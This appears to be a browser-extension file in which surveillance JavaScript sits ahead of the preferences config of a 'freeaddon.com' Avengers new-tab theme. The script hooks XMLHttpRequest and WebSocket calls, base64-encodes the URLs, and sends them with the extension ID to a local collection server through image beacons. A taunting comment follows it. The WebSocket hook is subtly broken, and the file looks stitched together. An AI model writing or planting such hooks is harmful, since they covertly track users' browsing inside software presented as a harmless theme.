function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
pref('xlp_pers_guid','');
pref('guid','');
pref('firstRun',true);
pref('firstRunDomain', 'freeaddon.com');
pref('firstRunLandingPage', 'http://freeaddon.com/avengers-wallpaper-hd-marvel-new-tab-themes/');
pref('firstVer','0');
pref('lastVer','0');
pref('ls_ts','0');

pref('cd','');
pref('cr','');
pref('uref','');
pref('itag','');
pref('sengine','');
pref('bg_img','bg-01.jpg');
pref('bg_color','');
pref('bg_img_list', 65);
pref('frame_bg_list', 2);
pref('bg_color_gif', {});

pref('geodata','');
pref('units_weather','imperial');
pref('date_format','{{m}}.{{d}}.{{y}}');
pref('time_format','12h');
pref('ver_reset_clicked_options', '');
pref('ver_update_ignore', '');
pref('ver_update_major', '0.1.7.1');
pref('ver_update_minor', '0.1.7.5');


